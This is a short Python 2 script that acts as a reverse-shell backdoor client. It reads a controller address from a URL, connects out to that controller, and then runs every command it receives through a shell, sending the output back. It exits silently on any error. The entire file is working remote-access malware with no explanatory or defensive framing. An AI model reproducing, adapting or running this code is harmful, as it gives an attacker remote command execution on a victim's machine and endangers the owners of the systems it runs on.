#coding:utf-8

import subprocess
import socket
import urllib2


controler_URL = 'http://localhost/ip.txt' #ip.txt content:  127.0.0.1:10000
controler_IP = ''
controler_Port = 0

def get_controler_IP():
    try:
        html = urllib2.urlopen(controler_URL).read().rstrip()
        return html.split(':')
    except:
        return None

def execute_cmd(cmd):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdoutput = proc.stdout.read() + proc.stderr.read()
    return stdoutput

def get_cmd(client_socket):
    try:
        response = client_socket.recv(4096)
        print response
        result = execute_cmd(response)
        client_socket.send(result)
    except:
        exit(0)

try:
    controler_info = get_controler_IP()
    if controler_info:
        controler_IP = controler_info[0]
        controler_Port = int(controler_info[1])
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((controler_IP, controler_Port))
        client.send('Ready!')
        while True:
            get_cmd(client)
except:
    exit(0)